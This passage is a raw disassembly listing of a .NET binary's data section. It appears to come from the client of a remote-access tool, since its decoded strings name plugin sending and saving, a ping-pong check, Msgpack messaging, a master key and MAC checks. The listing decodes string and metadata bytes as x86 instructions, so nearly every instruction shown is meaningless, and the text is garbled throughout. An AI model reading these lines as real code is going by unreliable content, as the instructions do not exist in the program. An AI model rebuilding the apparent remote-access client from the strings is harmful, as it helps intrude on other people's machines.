  40bb28:	09 70 00             	or     %esi,0x0(%eax)
  40bb2b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb2c:	00 6e 00             	add    %ch,0x0(%esi)
  40bb2f:	67 00 00             	add    %al,(%bx,%si)
  40bb32:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bb37:	75 00                	jne    0x40bb39
  40bb39:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bb3d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb3e:	00 00                	add    %al,(%eax)
  40bb40:	15 73 00 61 00       	adc    $0x610073,%eax
  40bb45:	76 00                	jbe    0x40bb47
  40bb47:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bb4b:	6c                   	insb   (%dx),%es:(%edi)
  40bb4c:	00 75 00             	add    %dh,0x0(%ebp)
  40bb4f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bb53:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb54:	00 00                	add    %al,(%eax)
  40bb56:	07                   	pop    %es
  40bb57:	44                   	inc    %esp
  40bb58:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bb5c:	00 00                	add    %al,(%eax)
  40bb5e:	15 73 00 65 00       	adc    $0x650073,%eax
  40bb63:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb64:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bb68:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bb6c:	00 67 00             	add    %ah,0x0(%edi)
  40bb6f:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bb75:	48                   	dec    %eax
  40bb76:	00 61 00             	add    %ah,0x0(%ecx)
  40bb79:	73 00                	jae    0x40bb7b
  40bb7b:	68 00 65 00 73       	push   $0x73006500
  40bb80:	00 00                	add    %al,(%eax)
  40bb82:	09 48 00             	or     %ecx,0x0(%eax)
  40bb85:	61                   	popa
  40bb86:	00 73 00             	add    %dh,0x0(%ebx)
  40bb89:	68 00 00 1b 50       	push   $0x501b0000
  40bb8e:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bb92:	00 67 00             	add    %ah,0x0(%edi)
  40bb95:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bb9b:	50                   	push   %eax
  40bb9c:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bba0:	00 67 00             	add    %ah,0x0(%edi)
  40bba3:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bba9:	52                   	push   %edx
  40bbaa:	00 75 00             	add    %dh,0x0(%ebp)
  40bbad:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbae:	00 00                	add    %al,(%eax)
  40bbb0:	0f 4d 00             	cmovge (%eax),%eax
  40bbb3:	73 00                	jae    0x40bbb5
  40bbb5:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bbb9:	61                   	popa
  40bbba:	00 63 00             	add    %ah,0x0(%ebx)
  40bbbd:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bbc0:	11 52 00             	adc    %edx,0x0(%edx)
  40bbc3:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bbc7:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bbcb:	76 00                	jbe    0x40bbcd
  40bbcd:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bbd2:	0b 45 00             	or     0x0(%ebp),%eax
  40bbd5:	72 00                	jb     0x40bbd7
  40bbd7:	72 00                	jb     0x40bbd9
  40bbd9:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbda:	00 72 00             	add    %dh,0x0(%edx)
  40bbdd:	00 47 6d             	add    %al,0x6d(%edi)
  40bbe0:	00 61 00             	add    %ah,0x0(%ecx)
  40bbe3:	73 00                	jae    0x40bbe5
  40bbe5:	74 00                	je     0x40bbe7
  40bbe7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bbeb:	4b                   	dec    %ebx
  40bbec:	00 65 00             	add    %ah,0x0(%ebp)
  40bbef:	79 00                	jns    0x40bbf1
  40bbf1:	20 00                	and    %al,(%eax)
  40bbf3:	63 00                	arpl   %eax,(%eax)
  40bbf5:	61                   	popa
  40bbf6:	00 6e 00             	add    %ch,0x0(%esi)
  40bbf9:	20 00                	and    %al,(%eax)
  40bbfb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbfc:	00 6f 00             	add    %ch,0x0(%edi)
  40bbff:	74 00                	je     0x40bc01
  40bc01:	20 00                	and    %al,(%eax)
  40bc03:	62 00                	bound  %eax,(%eax)
  40bc05:	65 00 20             	add    %ah,%gs:(%eax)
  40bc08:	00 6e 00             	add    %ch,0x0(%esi)
  40bc0b:	75 00                	jne    0x40bc0d
  40bc0d:	6c                   	insb   (%dx),%es:(%edi)
  40bc0e:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bc12:	00 6f 00             	add    %ch,0x0(%edi)
  40bc15:	72 00                	jb     0x40bc17
  40bc17:	20 00                	and    %al,(%eax)
  40bc19:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bc1d:	70 00                	jo     0x40bc1f
  40bc1f:	74 00                	je     0x40bc21
  40bc21:	79 00                	jns    0x40bc23
  40bc23:	2e 00 00             	add    %al,%cs:(%eax)
  40bc26:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bc2b:	70 00                	jo     0x40bc2d
  40bc2d:	75 00                	jne    0x40bc2f
  40bc2f:	74 00                	je     0x40bc31
  40bc31:	20 00                	and    %al,(%eax)
  40bc33:	63 00                	arpl   %eax,(%eax)
  40bc35:	61                   	popa
  40bc36:	00 6e 00             	add    %ch,0x0(%esi)
  40bc39:	20 00                	and    %al,(%eax)
  40bc3b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc3c:	00 6f 00             	add    %ch,0x0(%edi)
  40bc3f:	74 00                	je     0x40bc41
  40bc41:	20 00                	and    %al,(%eax)
  40bc43:	62 00                	bound  %eax,(%eax)
  40bc45:	65 00 20             	add    %ah,%gs:(%eax)
  40bc48:	00 6e 00             	add    %ch,0x0(%esi)
  40bc4b:	75 00                	jne    0x40bc4d
  40bc4d:	6c                   	insb   (%dx),%es:(%edi)
  40bc4e:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bc52:	00 00                	add    %al,(%eax)
  40bc54:	55                   	push   %ebp
  40bc55:	49                   	dec    %ecx
  40bc56:	00 6e 00             	add    %ch,0x0(%esi)
  40bc59:	76 00                	jbe    0x40bc5b
  40bc5b:	61                   	popa
  40bc5c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bc60:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bc64:	00 6d 00             	add    %ch,0x0(%ebp)
  40bc67:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bc6b:	73 00                	jae    0x40bc6d
  40bc6d:	61                   	popa
  40bc6e:	00 67 00             	add    %ah,0x0(%edi)
  40bc71:	65 00 20             	add    %ah,%gs:(%eax)
  40bc74:	00 61 00             	add    %ah,0x0(%ecx)
  40bc77:	75 00                	jne    0x40bc79
  40bc79:	74 00                	je     0x40bc7b
  40bc7b:	68 00 65 00 6e       	push   $0x6e006500
  40bc80:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bc84:	00 63 00             	add    %ah,0x0(%ebx)
  40bc87:	61                   	popa
  40bc88:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bc8c:	00 6f 00             	add    %ch,0x0(%edi)
  40bc8f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc90:	00 20                	add    %ah,(%eax)
  40bc92:	00 63 00             	add    %ah,0x0(%ebx)
  40bc95:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc96:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bc9a:	00 20                	add    %ah,(%eax)
  40bc9c:	00 28                	add    %ch,(%eax)
  40bc9e:	00 4d 00             	add    %cl,0x0(%ebp)
  40bca1:	41                   	inc    %ecx
  40bca2:	00 43 00             	add    %al,0x0(%ebx)
  40bca5:	29 00                	sub    %eax,(%eax)
  40bca7:	2e 00 00             	add    %al,%cs:(%eax)
  40bcaa:	05 58 00 32 00       	add    $0x320058,%eax
  40bcaf:	00 0f                	add    %cl,(%edi)
  40bcb1:	7b 00                	jnp    0x40bcb3
  40bcb3:	30 00                	xor    %al,(%eax)
  40bcb5:	3a 00                	cmp    (%eax),%al
  40bcb7:	44                   	inc    %esp
  40bcb8:	00 33                	add    %dh,(%ebx)
  40bcba:	00 7d 00             	add    %bh,0x0(%ebp)
  40bcbd:	20 00                	and    %al,(%eax)
  40bcbf:	00 0f                	add    %cl,(%edi)
  40bcc1:	7b 00                	jnp    0x40bcc3
  40bcc3:	30 00                	xor    %al,(%eax)
  40bcc5:	3a 00                	cmp    (%eax),%al
  40bcc7:	58                   	pop    %eax
  40bcc8:	00 32                	add    %dh,(%edx)
  40bcca:	00 7d 00             	add    %bh,0x0(%ebp)
  40bccd:	20 00                	and    %al,(%eax)
  40bccf:	00 2b                	add    %ch,(%ebx)
  40bcd1:	28 00                	sub    %al,(%eax)
  40bcd3:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcd4:	00 65 00             	add    %ah,0x0(%ebp)
  40bcd7:	76 00                	jbe    0x40bcd9
  40bcd9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bcdd:	20 00                	and    %al,(%eax)
  40bcdf:	75 00                	jne    0x40bce1
  40bce1:	73 00                	jae    0x40bce3
  40bce3:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bce8:	00 20                	add    %ah,(%eax)
  40bcea:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bcee:	00 70 00             	add    %dh,0x0(%eax)
  40bcf1:	65 00 20             	add    %ah,%gs:(%eax)
  40bcf4:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bcf7:	63 00                	arpl   %eax,(%eax)
  40bcf9:	31 00                	xor    %eax,(%eax)
  40bcfb:	00 45 28             	add    %al,0x28(%ebp)
  40bcfe:	00 65 00             	add    %ah,0x0(%ebp)
  40bd01:	78 00                	js     0x40bd03
  40bd03:	74 00                	je     0x40bd05
  40bd05:	38 00                	cmp    %al,(%eax)
  40bd07:	2c 00                	sub    $0x0,%al
  40bd09:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd0d:	74 00                	je     0x40bd0f
  40bd0f:	31 00                	xor    %eax,(%eax)
  40bd11:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bd15:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd19:	33 00                	xor    (%eax),%eax
  40bd1b:	32 00                	xor    (%eax),%al
  40bd1d:	29 00                	sub    %eax,(%eax)
  40bd1f:	20 00                	and    %al,(%eax)
  40bd21:	74 00                	je     0x40bd23
  40bd23:	79 00                	jns    0x40bd25
  40bd25:	70 00                	jo     0x40bd27
  40bd27:	65 00 20             	add    %ah,%gs:(%eax)
  40bd2a:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd2d:	63 00                	arpl   %eax,(%eax)
  40bd2f:	37                   	aaa
  40bd30:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bd33:	24 00                	and    $0x0,%al
  40bd35:	63 00                	arpl   %eax,(%eax)
  40bd37:	38 00                	cmp    %al,(%eax)
  40bd39:	2c 00                	sub    $0x0,%al
  40bd3b:	24 00                	and    $0x0,%al
  40bd3d:	63 00                	arpl   %eax,(%eax)
  40bd3f:	39 00                	cmp    %eax,(%eax)
  40bd41:	00 00                	add    %al,(%eax)
  40bd43:	00 14 74             	add    %dl,(%esp,%esi,2)
  40bd46:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40bd4a:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40bd4d:	24 f5                	and    $0xf5,%al
  40bd4f:	ac                   	lods   %ds:(%esi),%al
  40bd50:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40bd57:	7a 5c                	jp     0x40bdb5
  40bd59:	56                   	push   %esi
  40bd5a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bd5d:	89 03                	mov    %eax,(%ebx)
  40bd5f:	00 00                	add    %al,(%eax)
  40bd61:	01 03                	add    %eax,(%ebx)
  40bd63:	20 00                	and    %al,(%eax)
  40bd65:	01 02                	add    %eax,(%edx)
  40bd67:	06                   	push   %es
  40bd68:	0e                   	push   %cs
  40bd69:	03 06                	add    (%esi),%eax
  40bd6b:	12 09                	adc    (%ecx),%cl
  40bd6d:	03 06                	add    (%esi),%eax
  40bd6f:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bd73:	00 02                	add    %al,(%edx)
  40bd75:	03 06                	add    (%esi),%eax
  40bd77:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40bd7d:	03 06                	add    (%esi),%eax
  40bd7f:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40bd84:	03 06                	add    (%esi),%eax
  40bd86:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40bd8c:	06                   	push   %es
  40bd8d:	1c 02                	sbb    $0x2,%al
  40bd8f:	06                   	push   %es
  40bd90:	08 04 00             	or     %al,(%eax,%eax,1)
  40bd93:	00 12                	add    %dl,(%edx)
  40bd95:	0d 05 00 01 01       	or     $0x1010005,%eax
  40bd9a:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40bda0:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40bda6:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40bda9:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40bdaf:	01 1d 05 03 00 00    	add    %ebx,0x305
  40bdb5:	0a 04 00             	or     (%eax,%eax,1),%al
  40bdb8:	01 01                	add    %eax,(%ecx)
  40bdba:	0a 04 00             	or     (%eax,%eax,1),%al
  40bdbd:	00 12                	add    %dl,(%edx)
  40bdbf:	15 05 00 01 01       	adc    $0x1010005,%eax
  40bdc4:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40bdca:	02 03                	add    (%ebx),%al
  40bdcc:	00 00                	add    %al,(%eax)
  40bdce:	1c 03                	sbb    $0x3,%al
  40bdd0:	00 00                	add    %al,(%eax)
  40bdd2:	08 04 00             	or     %al,(%eax,%eax,1)
  40bdd5:	01 01                	add    %eax,(%ecx)
  40bdd7:	08 04 00             	or     %al,(%eax,%eax,1)
  40bdda:	01 02                	add    %eax,(%edx)
  40bddc:	0e                   	push   %cs
  40bddd:	0a 00                	or     (%eax),%al
  40bddf:	04 02                	add    $0x2,%al
  40bde1:	1c 12                	sbb    $0x12,%al
  40bde3:	19 12                	sbb    %edx,(%edx)
  40bde5:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40bdea:	01 01                	add    %eax,(%ecx)
  40bdec:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40bdf2:	1c 04                	sbb    $0x4,%al
  40bdf4:	08 00                	or     %al,(%eax)
  40bdf6:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40bdfc:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40bdff:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be05:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be08:	00 12                	add    %dl,(%edx)
  40be0a:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be0f:	03 08                	add    (%eax),%ecx
  40be11:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40be14:	08 00                	or     %al,(%eax)
  40be16:	08 03                	or     %al,(%ebx)
  40be18:	00 00                	add    %al,(%eax)
  40be1a:	0e                   	push   %cs
  40be1b:	04 00                	add    $0x0,%al
  40be1d:	01 0e                	add    %ecx,(%esi)
  40be1f:	0e                   	push   %cs
  40be20:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40be26:	d5 0a                	aad    $0xa
  40be28:	3a 06                	cmp    (%esi),%al
  40be2a:	00 01                	add    %al,(%ecx)
  40be2c:	12 29                	adc    (%ecx),%ch
  40be2e:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40be34:	03 00                	add    (%eax),%eax
  40be36:	00 18                	add    %bl,(%eax)
  40be38:	07                   	pop    %es
  40be39:	00 03                	add    %al,(%ebx)
  40be3b:	08 18                	or     %bl,(%eax)
  40be3d:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40be43:	18 0e                	sbb    %cl,(%esi)
  40be45:	06                   	push   %es
  40be46:	00 02                	add    %al,(%edx)
  40be48:	02 18                	add    (%eax),%bl
  40be4a:	10 02                	adc    %al,(%edx)
  40be4c:	06                   	push   %es
  40be4d:	00 01                	add    %al,(%ecx)
  40be4f:	11 30                	adc    %esi,(%eax)
  40be51:	11 30                	adc    %esi,(%eax)
  40be53:	06                   	push   %es
  40be54:	00 03                	add    %al,(%ebx)
  40be56:	01 09                	add    %ecx,(%ecx)
  40be58:	09 09                	or     %ecx,(%ecx)
  40be5a:	02 06                	add    (%esi),%al
  40be5c:	09 03                	or     %eax,(%ebx)
  40be5e:	06                   	push   %es
  40be5f:	11 30                	adc    %esi,(%eax)
  40be61:	04 00                	add    $0x0,%al
  40be63:	00 00                	add    %al,(%eax)
  40be65:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40be69:	00 00                	add    %al,(%eax)
  40be6b:	04 01                	add    $0x1,%al
  40be6d:	00 00                	add    %al,(%eax)
  40be6f:	00 06                	add    %al,(%esi)
  40be71:	00 02                	add    %al,(%edx)
  40be73:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40be76:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40be7b:	0e                   	push   %cs
  40be7c:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40be81:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40be86:	15 12 41 01 12       	adc    $0x12014112,%eax
  40be8b:	60                   	pusha
  40be8c:	05 00 01 01 12       	add    $0x12010100,%eax
  40be91:	60                   	pusha
  40be92:	04 00                	add    $0x0,%al
  40be94:	01 01                	add    %eax,(%ecx)
  40be96:	0e                   	push   %cs
  40be97:	18 06                	sbb    %al,(%esi)
  40be99:	15 12 45 01 15       	adc    $0x15014512,%eax
  40be9e:	12 49 0a             	adc    0xa(%ecx),%cl
  40bea1:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bea4:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40beaa:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40beaf:	0e                   	push   %cs
  40beb0:	04 20                	add    $0x20,%al
  40beb2:	00 00                	add    %al,(%eax)
  40beb4:	00 04 40             	add    %al,(%eax,%eax,2)
  40beb7:	00 00                	add    %al,(%eax)
  40beb9:	00 04 10             	add    %al,(%eax,%edx,1)
  40bebc:	00 00                	add    %al,(%eax)
  40bebe:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bec1:	01 01                	add    %eax,(%ecx)
  40bec3:	0e                   	push   %cs
  40bec4:	04 20                	add    $0x20,%al
  40bec6:	01 0e                	add    %ecx,(%esi)
  40bec8:	0e                   	push   %cs
  40bec9:	06                   	push   %es
  40beca:	20 01                	and    %al,(%ecx)
  40becc:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bed1:	20 02                	and    %al,(%edx)
  40bed3:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bed9:	00 01                	add    %al,(%ecx)
  40bedb:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bee0:	06                   	push   %es
  40bee1:	11 50 03             	adc    %edx,0x3(%eax)
  40bee4:	06                   	push   %es
  40bee5:	12 55 05             	adc    0x5(%ebp),%dl
  40bee8:	00 01                	add    %al,(%ecx)
  40beea:	0e                   	push   %cs
  40beeb:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bef0:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bef5:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40befb:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf01:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf07:	01 01                	add    %eax,(%ecx)
  40bf09:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf0e:	60                   	pusha
  40bf0f:	03 20                	add    (%eax),%esp
  40bf11:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf14:	20 00                	and    %al,(%eax)
  40bf16:	02 03                	add    (%ebx),%al
  40bf18:	28 00                	sub    %al,(%eax)
  40bf1a:	1c 03                	sbb    $0x3,%al
  40bf1c:	06                   	push   %es
  40bf1d:	12 60 0b             	adc    0xb(%eax),%ah
  40bf20:	20 02                	and    %al,(%edx)
  40bf22:	01 12                	add    %edx,(%edx)
  40bf24:	60                   	pusha
  40bf25:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf2a:	60                   	pusha
  40bf2b:	04 20                	add    $0x20,%al
  40bf2d:	00 12                	add    %dl,(%edx)
  40bf2f:	60                   	pusha
  40bf30:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf35:	0e                   	push   %cs
  40bf36:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf3b:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bf41:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bf46:	60                   	pusha
  40bf47:	08 03                	or     %al,(%ebx)
  40bf49:	20 00                	and    %al,(%eax)
  40bf4b:	08 05 28 01 12 60    	or     %al,0x60120128
  40bf51:	08 03                	or     %al,(%ebx)
  40bf53:	28 00                	sub    %al,(%eax)
  40bf55:	08 03                	or     %al,(%ebx)
  40bf57:	06                   	push   %es
  40bf58:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bf5c:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bf60:	01 08                	add    %ecx,(%eax)
  40bf62:	0e                   	push   %cs
  40bf63:	05 20 01 01 12       	add    $0x12010120,%eax
  40bf68:	61                   	popa
  40bf69:	04 20                	add    $0x20,%al
  40bf6b:	01 01                	add    %eax,(%ecx)
  40bf6d:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bf70:	01 01                	add    %eax,(%ecx)
  40bf72:	0b 03                	or     (%ebx),%eax
  40bf74:	20 00                	and    %al,(%eax)
  40bf76:	0b 03                	or     (%ebx),%eax
  40bf78:	20 00                	and    %al,(%eax)
  40bf7a:	0a 03                	or     (%ebx),%al
  40bf7c:	20 00                	and    %al,(%eax)
  40bf7e:	0d 05 20 01 01       	or     $0x1012005,%eax
  40bf83:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40bf88:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40bf8d:	01 0e                	add    %ecx,(%esi)
  40bf8f:	0e                   	push   %cs
  40bf90:	05 20 02 01 0e       	add    $0xe010220,%eax
  40bf95:	08 04 20             	or     %al,(%eax,%eiz,1)
  40bf98:	01 02                	add    %eax,(%edx)
  40bf9a:	0e                   	push   %cs
  40bf9b:	03 20                	add    (%eax),%esp
  40bf9d:	00 0e                	add    %cl,(%esi)
  40bf9f:	04 20                	add    $0x20,%al
  40bfa1:	01 01                	add    %eax,(%ecx)
  40bfa3:	02 04 20             	add    (%eax,%eiz,1),%al
  40bfa6:	01 01                	add    %eax,(%ecx)
  40bfa8:	0c 04                	or     $0x4,%al
  40bfaa:	20 01                	and    %al,(%ecx)
  40bfac:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40bfb2:	5c                   	pop    %esp
  40bfb3:	04 20                	add    $0x20,%al
  40bfb5:	00 11                	add    %dl,(%ecx)
  40bfb7:	64 04 20             	fs add $0x20,%al
  40bfba:	00 12                	add    %dl,(%edx)
  40bfbc:	59                   	pop    %ecx
  40bfbd:	03 28                	add    (%eax),%ebp
  40bfbf:	00 0e                	add    %cl,(%esi)
  40bfc1:	03 28                	add    (%eax),%ebp
  40bfc3:	00 0a                	add    %cl,(%edx)
  40bfc5:	03 28                	add    (%eax),%ebp
  40bfc7:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40bfcd:	5c                   	pop    %esp
  40bfce:	04 28                	add    $0x28,%al
  40bfd0:	00 11                	add    %dl,(%ecx)
  40bfd2:	64 04 00             	fs add $0x0,%al
  40bfd5:	00 00                	add    %al,(%eax)
  40bfd7:	00 04 03             	add    %al,(%ebx,%eax,1)
  40bfda:	00 00                	add    %al,(%eax)
  40bfdc:	00 04 04             	add    %al,(%esp,%eax,1)
  40bfdf:	00 00                	add    %al,(%eax)
  40bfe1:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40bfe8:	06                   	push   %es
  40bfe9:	00 00                	add    %al,(%eax)
  40bfeb:	00 04 07             	add    %al,(%edi,%eax,1)
  40bfee:	00 00                	add    %al,(%eax)
  40bff0:	00 04 08             	add    %al,(%eax,%ecx,1)
  40bff3:	00 00                	add    %al,(%eax)
  40bff5:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40bff8:	00 00                	add    %al,(%eax)
  40bffa:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40bffd:	00 00                	add    %al,(%eax)
  40bfff:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c002:	00 00                	add    %al,(%eax)
  40c004:	00 06                	add    %al,(%esi)
  40c006:	00 02                	add    %al,(%edx)
  40c008:	0e                   	push   %cs
  40c009:	12 61 08             	adc    0x8(%ecx),%ah
  40c00c:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c011:	61                   	popa
  40c012:	06                   	push   %es
  40c013:	00 02                	add    %al,(%edx)
  40c015:	0e                   	push   %cs
  40c016:	05 12 61 05 00       	add    $0x56112,%eax
  40c01b:	01 01                	add    %eax,(%ecx)
  40c01d:	12 61 06             	adc    0x6(%ecx),%ah
  40c020:	00 02                	add    %al,(%edx)
  40c022:	01 12                	add    %edx,(%edx)
  40c024:	61                   	popa
  40c025:	0e                   	push   %cs
  40c026:	07                   	pop    %es
  40c027:	00 02                	add    %al,(%edx)
  40c029:	01 12                	add    %edx,(%edx)
  40c02b:	61                   	popa
  40c02c:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c031:	01 12                	add    %edx,(%edx)
  40c033:	61                   	popa
  40c034:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c039:	12 61 0c             	adc    0xc(%ecx),%ah
  40c03c:	06                   	push   %es
  40c03d:	00 02                	add    %al,(%edx)
  40c03f:	01 12                	add    %edx,(%edx)
  40c041:	61                   	popa
  40c042:	02 06                	add    (%esi),%al
  40c044:	00 02                	add    %al,(%edx)
  40c046:	01 12                	add    %edx,(%edx)
  40c048:	61                   	popa
  40c049:	0b 06                	or     (%esi),%eax
  40c04b:	00 02                	add    %al,(%edx)
  40c04d:	01 12                	add    %edx,(%edx)
  40c04f:	61                   	popa
  40c050:	0a 03                	or     (%ebx),%al
  40c052:	06                   	push   %es
  40c053:	11 78 04             	adc    %edi,0x4(%eax)
  40c056:	20 01                	and    %al,(%ecx)
  40c058:	01 08                	add    %ecx,(%eax)
  40c05a:	08 01                	or     %al,(%ecx)
  40c05c:	00 08                	add    %cl,(%eax)
  40c05e:	00 00                	add    %al,(%eax)
  40c060:	00 00                	add    %al,(%eax)
  40c062:	00 1e                	add    %bl,(%esi)
  40c064:	01 00                	add    %eax,(%eax)
  40c066:	01 00                	add    %eax,(%eax)
  40c068:	54                   	push   %esp
  40c069:	02 16                	add    (%esi),%dl
  40c06b:	57                   	push   %edi
  40c06c:	72 61                	jb     0x40c0cf
  40c06e:	70 4e                	jo     0x40c0be
  40c070:	6f                   	outsl  %ds:(%esi),(%dx)
  40c071:	6e                   	outsb  %ds:(%esi),(%dx)
  40c072:	45                   	inc    %ebp
  40c073:	78 63                	js     0x40c0d8
  40c075:	65 70 74             	gs jo  0x40c0ec
  40c078:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c07f:	77 73                	ja     0x40c0f4
  40c081:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c087:	71 08                	jno    0x40c091
  40c089:	01 00                	add    %eax,(%eax)
  40c08b:	02 00                	add    (%eax),%al
  40c08d:	00 00                	add    %al,(%eax)
  40c08f:	00 00                	add    %al,(%eax)
  40c091:	05 01 00 00 00       	add    $0x1,%eax
  40c096:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c099:	00 07                	add    %al,(%edi)
  40c09b:	31 2e                	xor    %ebp,(%esi)
  40c09d:	30 2e                	xor    %ch,(%esi)
  40c09f:	30 2e                	xor    %ch,(%esi)
  40c0a1:	30 00                	xor    %al,(%eax)
  40c0a3:	00 65 01             	add    %ah,0x1(%ebp)
  40c0a6:	00 29                	add    %ch,(%ecx)
  40c0a8:	2e 4e                	cs dec %esi
  40c0aa:	45                   	inc    %ebp
  40c0ab:	54                   	push   %esp
  40c0ac:	46                   	inc    %esi
  40c0ad:	72 61                	jb     0x40c110
  40c0af:	6d                   	insl   (%dx),%es:(%edi)
  40c0b0:	65 77 6f             	gs ja  0x40c122
  40c0b3:	72 6b                	jb     0x40c120
  40c0b5:	2c 56                	sub    $0x56,%al
  40c0b7:	65 72 73             	gs jb  0x40c12d
  40c0ba:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c0c1:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c0c4:	72 6f                	jb     0x40c135
  40c0c6:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c0cd:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c0d4:	0e                   	push   %cs
